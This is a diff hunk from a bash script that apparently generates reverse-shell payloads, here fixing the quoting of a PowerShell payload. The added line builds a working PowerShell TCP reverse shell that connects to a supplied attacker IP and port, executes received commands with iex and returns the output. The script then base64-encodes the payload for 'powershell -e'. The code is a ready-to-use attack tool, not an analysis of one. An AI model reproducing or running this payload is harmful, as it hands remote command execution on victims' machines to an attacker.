@@ -43,7 +43,7 @@ elif [[ "$1" == "powershell" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} PowerShell reverse shell payloads generated:\n"
 
     # shellcheck disable=SC2016
-    payload=$(echo -n "\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\",$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$,bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
+    payload=$(echo -n '$client = New-Object System.Net.Sockets.TCPClient("'"$IP"'",'"$2"');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
     echo -e "\t${YELLOW}-${ENDCOLOR} powershell -e $payload"
 
 else
